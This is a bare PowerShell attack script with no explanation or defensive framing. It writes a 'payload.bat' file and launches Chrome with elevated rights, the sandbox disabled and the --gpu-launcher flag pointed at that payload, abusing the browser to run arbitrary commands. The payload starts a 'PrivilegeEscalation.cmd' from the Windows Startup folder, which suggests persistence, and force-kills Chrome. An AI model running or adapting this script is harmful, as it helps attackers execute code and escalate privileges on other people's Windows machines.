$Temp = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("LocalApplicationData"), "payload.bat")
$Payload = 'powershell -command "Start-Process -FilePath \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.cmd\"; $chrome = Get-Process -name chrome; $chrome | ForEach-Object { Stop-Process -Name chrome -Force }"'

$Payload | Set-Content -Path $Temp

Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--disable-gpu-sandbox --gpu-launcher=$Temp" -Verb RunAs